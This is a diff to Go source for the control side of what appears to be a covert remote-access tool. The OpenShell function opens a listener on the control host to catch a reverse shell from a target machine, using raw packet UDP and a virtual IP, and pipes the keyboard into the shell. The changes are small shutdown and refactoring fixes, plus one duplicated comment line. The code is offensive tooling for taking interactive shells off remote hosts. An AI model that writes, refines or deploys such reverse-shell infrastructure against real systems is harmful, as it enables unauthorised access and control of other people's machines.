@@ -110,6 +110,7 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
+// OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
@@ -131,15 +132,17 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		return fmt.Errorf("invalid -subnet: %w", err)
 	}
 
+	// FIXED: Valid host gateway inside the subnet pool range
+	virtualIP, err := netip.ParseAddr("172.16.0.1")
+	if err != nil {
+		return err
+	}
+
 	addr := network.LocalIP().IP
 	localIP, _ := netip.AddrFromSlice(addr)
 	device, err := network.GetNetworkInterface(addr)
 	if err != nil {
 		return fmt.Errorf("invalid interface: %w", err)
-	}
-	virtualIP, err := netip.ParseAddr("172.16.0.1")
-	if err != nil {
-		return fmt.Errorf("invalid virtual ip: %w", err)
 	}
 
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
@@ -213,16 +216,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		close(done)
 	}()
 
-	// FIXED: Watchdog to force break the blocking os.Stdin.Read loop on FreeBSD when target exits
-	go func() {
-		<-done
-		// Find our own process and deliver a SIGINT to trigger the signal context shutdown
-		p, err := os.FindProcess(os.Getpid())
-		if err == nil {
-			_ = p.Signal(os.Interrupt)
-		}
-	}()
-
 	// Stream keyboard straight into the connection
 	go func() {
 		buf := make([]byte, 1024)
@@ -244,7 +237,17 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		}
 	}()
 
-	<-done
+	// FIXED: Unified select blocks until either event completes.
+	// If the target disconnects cleans, we kick ourselves out of the blocking Stdin Read immediately.
+	select {
+	case <-done:
+		p, err := os.FindProcess(os.Getpid())
+		if err == nil {
+			_ = p.Signal(os.Interrupt)
+		}
+	case <-ctx.Done():
+	}
+
 	return nil
 }
 
